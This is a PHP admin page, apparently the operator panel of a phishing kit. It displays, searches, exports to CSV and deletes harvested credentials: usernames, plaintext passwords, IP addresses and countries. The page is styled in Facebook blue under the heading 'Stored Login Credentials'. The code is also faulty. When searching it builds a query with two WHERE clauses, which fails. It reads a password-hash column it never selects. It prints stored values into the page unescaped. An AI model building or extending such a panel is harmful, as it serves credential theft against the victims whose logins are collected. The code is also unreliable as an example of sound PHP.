<?php
session_start();

/* PROTECT ADMIN PAGE */
if (!isset($_SESSION['admin_logged_in'])) {
    header("Location: login.php");
    exit;
}

/* DATABASE CONNECTION */
$conn = new mysqli("localhost", "root", "", "my_login_system");
if ($conn->connect_error) {
    die("Database connection failed");
}

/* HANDLE SEARCH */
$search = "";
if (isset($_GET['search'])) {
    $search = $conn->real_escape_string($_GET['search']);
}

/* PAGINATION SETTINGS */
$limit = 20;
$page = isset($_GET['page']) && is_numeric($_GET['page']) ? (int)$_GET['page'] : 1;
$offset = ($page - 1) * $limit;

/* COUNT TOTAL ROWS */
$countSql = "SELECT COUNT(*) as total FROM login_attempts";
if ($search !== "") {
    $countSql .= " WHERE username LIKE '%$search%'
                   OR password_plain LIKE '%$search%'
                   OR ip LIKE '%$search%'
                   OR country LIKE '%$search%'";
}
$countResult = $conn->query($countSql);
$totalRows = $countResult->fetch_assoc()['total'];
$totalPages = ceil($totalRows / $limit);

/* BUILD QUERY */
$sql = "SELECT id, username, password_plain, ip, country, created_at
        FROM login_attempts
        WHERE deleted = 0";

if ($search !== "") {
    $sql .= " WHERE deleted = 0
              AND (
                  username LIKE '%$search%'
                  OR password_plain LIKE '%$search%'
                  OR ip LIKE '%$search%'
                  OR country LIKE '%$search%'
                  ) ";
}

$sql .= " ORDER BY id ASC LIMIT $limit OFFSET $offset";

$result = $conn->query($sql);

/* AJAX RESPONSE */
if (isset($_GET['ajax'])) {
    if ($result && $result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            $formattedId = str_pad($row['id'], 5, "0", STR_PAD_LEFT);

            echo "<tr>
                    <td>{$formattedId}</td>
                    <td>{$row['username']}</td>
                    <td>{$row['password_plain']}</td>
                    <td style='max-width:300px; word-break:break-all;'>{$row['password_hash']}</td>
                    <td>{$row['ip']}</td>
                    <td>{$row['country']}</td>
                    <td>{$row['created_at']}</td>
                    <td>
                        <a href='delete_row.php?id={$row['id']}'
                           onclick=\"return confirm('Delete this record?');\">
                           Delete
                        </a>
                    </td>
                  </tr>";
        }
    } else {
        echo "<tr><td colspan='8'>No results</td></tr>";
    }
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<title>Admin Dashboard</title>
<style>
body { font-family: Arial; background:#f7f7f7; padding:20px; }
table { border-collapse: collapse; width:100%; background:#fff; }
th, td { padding:10px; border:1px solid #ccc; font-size:14px; }
th { background:#efefef; }
input { padding:8px; width:300px; }
.pagination a {
    padding:6px 10px;
    margin:2px;
    border:1px solid #ccc;
    text-decoration:none;
    background:#fff;
}
.pagination a.active {
    background:#1877f2;
    color:#fff;
}
.logout {
    float:right;
    text-decoration:none;
    background:#e74c3c;
    color:#fff;
    padding:8px 12px;
    border-radius:4px;
}
</style>
</head>
<body>

<a href="logout.php" class="logout">Logout</a>
<a href="trash.php" style="margin-left:10px;">View Trash</a>

<h2>Stored Login Credentials</h2>
<a href="export_csv.php" style="margin-bottom:15px; display:inline-block;">Export to CSV</a>

<input type="text" id="searchInput" placeholder="Search username, IP, country, password..." autocomplete="off">

<table>
<thead>
<tr>
    <th>ID</th>
    <th>Username</th>
    <th>Password</th>
    <th>IP Address</th>
    <th>Country</th>
    <th>Date</th>
    <th>Action</th>
</tr>
</thead>

<tbody id="tableBody">
<?php
if ($result && $result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        $formattedId = str_pad($row['id'], 5, "0", STR_PAD_LEFT);

        echo "<tr>
                <td>{$formattedId}</td>
                <td>{$row['username']}</td>
                <td>{$row['password_plain']}</td>
                <td>{$row['ip']}</td>
                <td>{$row['country']}</td>
                <td>{$row['created_at']}</td>
                <td>
                    <a href='delete_row.php?id={$row['id']}'
                       onclick=\"return confirm('Delete this record?');\">
                       Delete
                    </a>
                </td>
              </tr>";
    }
} else {
    echo "<tr><td colspan='8'>No login attempts found</td></tr>";
}
?>
</tbody>
</table>

<div class="pagination" id="pagination">
<?php
for ($i = 1; $i <= $totalPages; $i++) {
    $active = ($i == $page) ? "active" : "";
    echo "<a class='$active' href='?page=$i'>$i</a>";
}
?>
</div>

<script>
const searchInput = document.getElementById("searchInput");
const tableBody = document.getElementById("tableBody");
const pagination = document.getElementById("pagination");

searchInput.addEventListener("keyup", () => {
    const value = searchInput.value;

    fetch("dashboard.php?search=" + encodeURIComponent(value) + "&ajax=1")
        .then(res => res.text())
        .then(data => {
            tableBody.innerHTML = data;
            pagination.style.display = value ? "none" : "block";
        });
});
</script>

</body>
</html>
